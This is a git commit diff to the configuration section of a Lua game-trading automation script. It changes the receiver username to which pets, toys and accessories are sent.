09842ac10af70643fd9bf29462fcd92ecb4aa7da
lucivaantarez <151172065+lucivaantarez@users.noreply.github.com>
2026-09-10 15:24:57 +0700

    Update util.lua

--- util.lua
+++ util.lua
@@ -14,7 +14,7 @@
             AutoAcceptTrades = true, -- Auto accept trade requests sent TO you
             AutoLeaveAfterTrades = false, -- Leave/kick once every target has nothing left to receive
             LeaveDelay = 5, -- Seconds to wait after trades finish before leaving
-            Usernames = {"Xz_Turbo4hKingDhBaco"}, -- Receivers to send to e.g. {"player1", "player2"} (also pickable in Trade tab)
+            Usernames = {"XzNightUROmegalzX199"}, -- Receivers to send to e.g. {"player1", "player2"} (also pickable in Trade tab)
             TradeMode = "specific", -- "all" = send everything in Categories | "specific" = only the Items list
             Categories = {"pets", "toys", "pet_accessories"}, -- What to send
             Items = {
